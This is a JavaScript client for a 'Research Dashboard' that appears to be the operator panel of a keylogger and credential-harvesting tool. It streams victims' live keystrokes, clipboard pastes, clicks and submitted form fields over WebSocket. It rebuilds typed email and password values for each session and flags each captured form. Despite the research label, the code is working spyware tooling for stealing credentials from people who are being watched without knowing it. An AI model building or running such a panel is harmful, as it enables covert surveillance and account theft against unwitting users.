/**
 * ═══════════════════════════════════════════════════════════════
 * Research Dashboard — Real-Time WebSocket Client
 * ═══════════════════════════════════════════════════════════════
 */

(function () {
    'use strict';

    // ─── DOM References ────────────────────────────────────────
    const liveFeed = document.getElementById('live-feed');
    const eventLog = document.getElementById('event-log');
    const sessionList = document.getElementById('session-list');
    const statSessions = document.getElementById('stat-sessions-value');
    const statKeystrokes = document.getElementById('stat-keystrokes-value');
    const statClipboard = document.getElementById('stat-clipboard-value');
    const statForms = document.getElementById('stat-forms-value');
    const connectionStatus = document.getElementById('connection-status');
    const reconEmail = document.getElementById('recon-email');
    const reconPassword = document.getElementById('recon-password');

    // ─── State ─────────────────────────────────────────────────
    let totalKeystrokes = 0;
    let totalClipboard = 0;
    let totalForms = 0;
    let sessions = new Map();
    let feedStarted = false;

    // Reconstructed inputs per session
    let reconstructed = {};

    // ─── Socket.IO Connect ─────────────────────────────────────
    const socket = io({
        transports: ['websocket', 'polling'],
        reconnection: true
    });

    socket.on('connect', () => {
        socket.emit('dashboard:join');
        updateConnectionStatus(true);
        addEvent('🔌', 'Dashboard connected to server');

        // Fetch existing sessions
        fetch('/api/sessions')
            .then(r => r.json())
            .then(data => {
                data.forEach(s => {
                    sessions.set(s.id, s);
                    renderSession(s);
                });
                totalKeystrokes = data.reduce((sum, s) => sum + s.totalKeystrokes, 0);
                totalClipboard = data.reduce((sum, s) => sum + s.clipboardEvents, 0);
                totalForms = data.reduce((sum, s) => sum + s.formSubmissions, 0);
                updateStats();
            })
            .catch(() => { });
    });

    socket.on('disconnect', () => {
        updateConnectionStatus(false);
        addEvent('❌', 'Disconnected from server');
    });

    // ─── Real-Time Event Handlers ──────────────────────────────

    // New session registered
    socket.on('session:new', (data) => {
        sessions.set(data.id, {
            ...data,
            totalKeystrokes: 0,
            clipboardEvents: 0,
            formSubmissions: 0
        });
        renderSession(data);
        updateStats();
        addEvent('👤', `New session: <strong>${truncate(data.id, 20)}</strong> — ${data.metadata?.browser || '?'} / ${data.metadata?.os || '?'}`);
    });

    // Live keystrokes
    socket.on('keystrokes:live', (data) => {
        if (!feedStarted) {
            liveFeed.innerHTML = '';
            feedStarted = true;
        }

        totalKeystrokes += data.keys.length;

        data.keys.forEach(k => {
            addFeedEntry(k);
            reconstructInput(data.sessionId, k);
        });

        // Update session count
        const session = sessions.get(data.sessionId);
        if (session) {
            session.totalKeystrokes = data.totalKeystrokes;
            updateSessionDisplay(data.sessionId);
        }

        updateStats();
        animateStat('stat-keystrokes-value');
    });

    // Clipboard
    socket.on('clipboard:live', (data) => {
        totalClipboard++;
        addFeedEntry({
            key: `📋 "${data.content}"`,
            field: 'clipboard',
            timestamp: data.timestamp,
            isClipboard: true
        });

        // Also add to reconstructed
        if (data.field && reconstructed[data.field] !== undefined) {
            reconstructed[data.field] += data.content;
            updateReconstructedDisplay();
        }

        addEvent('📋', `Clipboard paste in <strong>${data.field || 'unknown'}</strong>: "${truncate(data.content, 30)}"`);
        updateStats();
        animateStat('stat-clipboard-value');
    });

    // Form submission
    socket.on('form:live', (data) => {
        totalForms++;
        addFeedEntry({
            key: '🚨 FORM CAPTURED: ' + Object.entries(data.fields).map(([k, v]) => `${k}="${v}"`).join(', '),
            field: 'form-capture',
            timestamp: data.timestamp,
            isFormCapture: true
        });
        addEvent('🚨', `<strong>Form Captured!</strong> Fields: ${Object.keys(data.fields).join(', ')}`);
        updateStats();
        animateStat('stat-forms-value');

        // Flash the form stat card
        document.getElementById('stat-forms').classList.add('alert-flash');
        setTimeout(() => document.getElementById('stat-forms').classList.remove('alert-flash'), 1000);
    });

    // Click
    socket.on('click:live', (data) => {
        addEvent('🖱️', `Click: <strong>${data.element}</strong> ${data.text ? `"${truncate(data.text, 25)}"` : ''}`);
    });

    // Session disconnected
    socket.on('session:disconnected', (data) => {
        const session = sessions.get(data.sessionId);
        if (session) session.disconnected = true;
        updateSessionDisplay(data.sessionId);
        addEvent('🔴', `Session <strong>${truncate(data.sessionId, 20)}</strong> disconnected`);
    });

    // ─── UI Rendering ──────────────────────────────────────────

    function addFeedEntry(k) {
        const el = document.createElement('div');
        el.className = 'feed-entry';

        const time = new Date(k.timestamp).toLocaleTimeString('en-GB', {
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        });

        const isSpecial = k.key?.startsWith('[') && k.key?.endsWith(']');
        const fieldClass = k.field || 'unknown';

        el.innerHTML = `
            <span class="feed-time">${time}</span>
            <span class="feed-field ${fieldClass}">${k.field || '?'}</span>
            <span class="feed-key ${isSpecial ? 'special' : ''} ${k.isClipboard ? 'clipboard-text' : ''}">${escapeHtml(k.key)}</span>
        `;

        liveFeed.appendChild(el);
        liveFeed.scrollTop = liveFeed.scrollHeight;

        // Limit the feed to 500 entries
        while (liveFeed.children.length > 500) {
            liveFeed.removeChild(liveFeed.firstChild);
        }
    }

    function reconstructInput(sessionId, k) {
        const field = k.field;
        if (!field || field === 'system' || field === 'unknown') return;

        if (!reconstructed[field]) {
            reconstructed[field] = '';
        }

        const key = k.key;

        if (key === '[Backspace]') {
            reconstructed[field] = reconstructed[field].slice(0, -1);
        } else if (key === '[Delete]' || key === '[Tab]' || key === '[Escape]' ||
            key === '[CapsLock]' || key === '[Shift]' || key === '[Control]' ||
            key === '[Alt]' || key === '[Meta]' || key === '[Enter]' ||
            key.startsWith('[Arrow') || key.startsWith('[Ctrl+') ||
            key === '[TAB_HIDDEN]' || key === '[TAB_VISIBLE]') {
            // Skip special keys for reconstruction
        } else {
            reconstructed[field] = (reconstructed[field] || '') + key;
        }

        updateReconstructedDisplay();
    }

    function updateReconstructedDisplay() {
        reconEmail.textContent = reconstructed['email'] || '_';
        reconPassword.textContent = reconstructed['password'] || '_';

        // Also update/create other fields dynamically
        const container = document.getElementById('reconstructed-fields');
        Object.entries(reconstructed).forEach(([field, value]) => {
            if (field === 'email' || field === 'password') return;
            let existing = document.getElementById(`recon-${field}`);
            if (!existing) {
                const div = document.createElement('div');
                div.className = 'recon-field';
                div.innerHTML = `
                    <span class="recon-label">${escapeHtml(field)}</span>
                    <span class="recon-value" id="recon-${field}">_</span>
                `;
                container.appendChild(div);
                existing = document.getElementById(`recon-${field}`);
            }
            existing.textContent = value || '_';
        });
    }

    function renderSession(data) {
        // Remove empty state
        const empty = sessionList.querySelector('.feed-empty');
        if (empty) empty.remove();

        const el = document.createElement('div');
        el.className = 'session-item';
        el.id = `session-${data.id}`;

        const meta = data.metadata || {};
        el.innerHTML = `
            <div class="session-info">
                <span class="session-id">${truncate(data.id, 24)}</span>
                <span class="session-meta">${meta.browser || '?'} / ${meta.os || '?'} • ${meta.screenResolution || '?'}</span>
            </div>
            <div class="session-stats">
                <span class="session-count">${data.totalKeystrokes || 0} keys</span>
                <div class="session-status"></div>
            </div>
        `;

        sessionList.prepend(el);
    }

    function updateSessionDisplay(sessionId) {
        const el = document.getElementById(`session-${sessionId}`);
        if (!el) return;

        const session = sessions.get(sessionId);
        if (!session) return;

        const countEl = el.querySelector('.session-count');
        if (countEl) countEl.textContent = `${session.totalKeystrokes || 0} keys`;

        const statusEl = el.querySelector('.session-status');
        if (statusEl && session.disconnected) {
            statusEl.classList.add('disconnected');
        }
    }

    function addEvent(icon, text) {
        const el = document.createElement('div');
        el.className = 'event-entry';

        const time = new Date().toLocaleTimeString('en-GB', {
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        });

        el.innerHTML = `
            <span class="event-type">${icon}</span>
            <span class="event-text">${text}</span>
            <span class="event-time">${time}</span>
        `;

        eventLog.prepend(el);

        // Limit log
        while (eventLog.children.length > 200) {
            eventLog.removeChild(eventLog.lastChild);
        }
    }

    function updateStats() {
        statSessions.textContent = sessions.size;
        statKeystrokes.textContent = totalKeystrokes;
        statClipboard.textContent = totalClipboard;
        statForms.textContent = totalForms;
    }

    function animateStat(id) {
        const el = document.getElementById(id);
        el.classList.remove('flash');
        void el.offsetWidth; // Trigger reflow
        el.classList.add('flash');
    }

    function updateConnectionStatus(connected) {
        const dot = connectionStatus.querySelector('.status-dot');
        const text = connectionStatus.querySelector('span');
        if (connected) {
            dot.className = 'status-dot connected';
            text.textContent = 'Connected';
        } else {
            dot.className = 'status-dot disconnected';
            text.textContent = 'Disconnected';
        }
    }

    // ─── Utilities ─────────────────────────────────────────────

    function truncate(str, len) {
        if (!str) return '';
        return str.length > len ? str.substring(0, len) + '…' : str;
    }

    function escapeHtml(str) {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    // ─── Button Handlers ───────────────────────────────────────

    document.getElementById('clear-feed').addEventListener('click', () => {
        liveFeed.innerHTML = `
            <div class="feed-empty">
                <p>Feed cleared</p>
            </div>
        `;
        feedStarted = false;
    });

    document.getElementById('clear-reconstructed').addEventListener('click', () => {
        reconstructed = {};
        reconEmail.textContent = '_';
        reconPassword.textContent = '_';
    });

})();
